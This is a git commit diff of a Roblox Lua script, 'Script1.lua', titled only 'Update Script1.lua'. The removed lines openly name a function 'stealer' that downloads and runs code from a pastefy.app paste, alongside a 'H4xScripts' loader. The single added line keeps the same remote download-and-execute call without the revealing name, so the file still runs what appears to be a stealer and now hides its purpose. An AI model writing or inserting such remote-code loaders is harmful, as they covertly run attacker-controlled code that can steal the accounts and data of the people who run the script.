9614d9f1a317595f3f191adeed5b36b8f184adac
ScriptLast <hadikusumah012@gmail.com>
2025-06-01 05:42:37 +0700

    Update Script1.lua

--- Script1.lua
+++ Script1.lua
@@ -1,9 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet('https://pastefy.app/XQF9q7W1/raw'))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/H4xScripts/Loader/refs/heads/main/loader2.lua'))()
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+loadstring(game:HttpGet('https://pastefy.app/XQF9q7W1/raw'))()
